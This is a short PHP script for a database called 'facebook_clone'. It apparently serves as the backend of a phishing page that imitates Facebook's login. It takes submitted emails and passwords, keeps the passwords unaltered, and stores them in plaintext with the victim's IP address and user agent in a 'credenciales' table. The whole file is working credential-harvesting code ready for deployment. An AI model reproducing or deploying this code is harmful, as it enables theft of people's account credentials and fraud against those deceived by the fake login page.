<?php
header('Content-Type: application/json');

// Configuración de la base de datos
if (!defined('SERVIDOR')) {
    define('SERVIDOR', 'localhost');
}
if (!defined('USUARIO')) {
    define('USUARIO', 'root');
}
if (!defined('PASSWORD')) {
    define('PASSWORD', '');
}
if (!defined('DB')) {
    define('DB', 'facebook_clone');
}

try {
    // Establecer conexión PDO
    $servidor = "mysql:dbname=" . DB . ";host=" . SERVIDOR;
    $pdo = new PDO($servidor, USUARIO, PASSWORD, [
        PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8mb4",
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);
    
    // Obtener y sanitizar datos del POST
    $email = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
    $password = $_POST['password'] ?? ''; // No filtrar contraseña para mantener caracteres especiales
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    // Validar email
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        throw new Exception("Email inválido");
    }
    
    // Insertar en la base de datos con consulta preparada
    $sql = "INSERT INTO credenciales (email, password, ip_address, user_agent, fecha) 
            VALUES (:email, :password, :ip_address, :user_agent, NOW())";
    
    $stmt = $pdo->prepare($sql);
    $stmt->execute([
        ':email' => $email,
        ':password' => $password,
        ':ip_address' => $ip_address,
        ':user_agent' => $user_agent
    ]);
    
    // Respuesta exitosa
    echo json_encode([
        'success' => true,
        'message' => 'Datos almacenados correctamente'
    ]);
    
} catch (PDOException $e) {
    // Error de base de datos
    echo json_encode([
        'success' => false,
        'message' => 'Error en la base de datos: ' . $e->getMessage()
    ]);
} catch (Exception $e) {
    // Error general
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage()
    ]);
}
?>